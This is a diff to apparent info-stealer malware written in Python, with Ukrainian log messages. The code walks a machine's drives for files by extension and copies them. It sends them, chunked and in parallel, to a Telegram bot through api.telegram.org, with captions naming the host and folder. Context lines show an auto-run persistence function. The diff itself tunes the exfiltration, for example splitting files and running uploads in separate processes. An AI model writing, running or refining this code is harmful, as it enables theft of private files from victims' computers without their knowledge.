@@ -24,7 +24,7 @@ if os.name=='nt':
     except ImportError:
         logging.debug('Для вінди pip install winshell')
 
-PROC_NUM=15
+PROC_NUM=10
 file_list=[]
 sep='/'
 chtid=wt=0
@@ -336,17 +336,30 @@ def addToAutoRun():
     return
 
 def send_document(bot_token,chtid,docfile,caption='Nothing'):
+    caption=caption.replace(r'(','')
+    caption=caption.replace(r')','')
+    caption=caption.replace('[','')
+    caption=caption.replace(']','')    
+    print(f"{docfile=}")
     url=f"https://api.telegram.org/bot{bot_token}/sendDocument"
     data = {'chat_id' : chtid,'caption': caption}
-    files={'document': open(docfile, 'rb')}
+    files={'document': (docfile,open(docfile, 'rb'))}
     r=requests.post(url,params=data,files=files)
     return
 
+def send_document(bot_token,chtid,docfile,caption='Nothing'):
+    url=f"https://api.telegram.org/bot{bot_token}/sendDocument"
+    data = {'chat_id' : chtid,'caption': caption}
+    files={'document': (docfile,open(docfile, 'rb'))}
+    r=requests.post(url,params=data,files=files)
+    return
+    
 def fileUploader(bot_token,chtid,fpath:str,caption:str):
+    caption=re.sub("[\[\]()]","",caption)
     maxsize=40*1024*1024-1	
+    allprocesses=[]
     if not os.path.exists(fpath):
-        return
-        
+        return 
     size=os.path.getsize(fpath)
     if size>maxsize:
         cnt=0
@@ -357,27 +370,50 @@ def fileUploader(bot_token,chtid,fpath:str,caption:str):
                 pos=i*maxsize
                 endpos=(i+1)*maxsize
                 buf=fl.read(maxsize)
-                newfname=f"{myfpath.stem}_{cnt}{myfpath.suffix}"
-                with open(f"{myfpath.stem}_{cnt}{myfpath.suffix}",'wb') as fw:
+                if len(myfpath.stem)>45:
+                    stem=myfpath.stem
+                    stem=stem[:45]                     
+                    stem=re.sub("[\[\]()]","",stem)
+                    newfname=f"{stem}_{cnt}{myfpath.suffix}"
+                else:
+                    newfname=f"{myfpath.stem}_{cnt}{myfpath.suffix}"                
+                with open(newfname,'wb') as fw:
                     fw.write(buf)
+                prc=Process(target=send_document,args=(bot_token,chtid,newfname,f"{caption}|{newfname}"))
+                allprocesses.append(prc)
+                prc.start()
                 cnt+=1
             else:
                 buf=fl.read()
-                with open(f"{myfpath.stem}_{cnt}{myfpath.suffix}",'wb') as fw:
-                    fw.write(buf)
-                cnt+=1            
-            chunkNum=cnt
-            cnt=0
-            for _ in range(chunkNum):
-                with open(fpath,'rb') as fl: 
-                    print(f"{myfpath.stem}_{cnt}{myfpath.suffix}")
-                    send_document(bot_token,chtid,f"{myfpath.stem}_{cnt}{myfpath.suffix}",f"{caption}|{myfpath.stem}_{cnt}{myfpath.suffix}")
-                    os.remove(f"{myfpath.stem}_{cnt}{myfpath.suffix}")
-                    time.sleep(3)
-                    cnt+=1
+                if len(buf)>0:
+                    if len(myfpath.stem)>45:
+                        stem=myfpath.stem
+                        stem=stem[:45]                       
+                        stem=re.sub("[\[\]()]","",stem)
+                        newfname=f"{stem}_{cnt}{myfpath.suffix}"
+                    else:
+                        newfname=f"{myfpath.stem}_{cnt}{myfpath.suffix}"                
+                    with open(newfname,'wb') as fw:
+                        fw.write(buf)   
+                    prc=Process(target=send_document,args=(bot_token,chtid,newfname,f"{caption}|{newfname}"))
+                    allprocesses.append(prc)
+                    prc.start()
+            for idx in range(len(allprocesses)):
+                allprocesses[idx].join()
+                if len(myfpath.stem)>45:
+                    stem=myfpath.stem
+                    stem=stem[:45]
+                    stem=re.sub("[\[\]()]","",stem)
+                    newfname=f"{stem}_{idx}{myfpath.suffix}"
+                else:
+                    newfname=f"{myfpath.stem}_{idx}{myfpath.suffix}"
+                try:
+                    os.remove(newfname)
+                except FileNotFoundError:
+                    print(f"No found {newfname}")
     else:
         send_document(bot_token,chtid,fpath,f"{caption}|{os.path.split(fpath)[1]}")
-
+        
 def searchFilesProc(fileList,drive,extlist):
     global PROC_NUM
     hostname=socket.gethostname()
@@ -396,7 +432,7 @@ def searchFilesProc(fileList,drive,extlist):
                 
 def superProc(fileList,num,extlist,hostdir,hostname,wt,cht):
     cnt=num
-    PROC_NUM=15
+    PROC_NUM=10
     pname=''
     allfiles=[]
     global sep
@@ -414,7 +450,7 @@ def superProc(fileList,num,extlist,hostdir,hostname,wt,cht):
             try:
                 fname,dname=fileList[cnt]
                 if not fname in allfiles:
-
+                    allfiles.append(fname)
                     dirname=f"{hostdir}{sep}{dname}"
                     if not os.path.exists(dirname):
                         os.mkdir(dirname)
@@ -423,17 +459,9 @@ def superProc(fileList,num,extlist,hostdir,hostname,wt,cht):
                     if not any([ele for ele in ["opera","firefox","chrome","chromium","safari"] if (ele in dirname) ]):
                         newname=fname.replace(':\\','.')
                         newname=newname.replace(sep,'.')
+                    fileUploader(wt,cht,fname,f"Folder:{dname}|Host:{hostname}|Origname:_{os.path.split(fname)[1]}_")
                     copyFile(fname,f"{dirname}{sep}{newname}")
                     fname=fname.replace('\\\\','\\')
-            except:
-                pass
-            try:
-                fname,dname=fileList[cnt]                         
-                # send_document(wt,cht,fname,f"Folder:{dname} Host:{hostname} Origname:{os.path.split(fname)[1]} {fname}")
-                if not fname in allfiles:
-                    if os.path.exists(fname):
-                        allfiles.append(fname)
-                        fileUploader(wt,cht,fname,f"Folder:{dname}|Host:{hostname}|Origname:{os.path.split(fname)[1]}")
             except:
                 pass
             try:
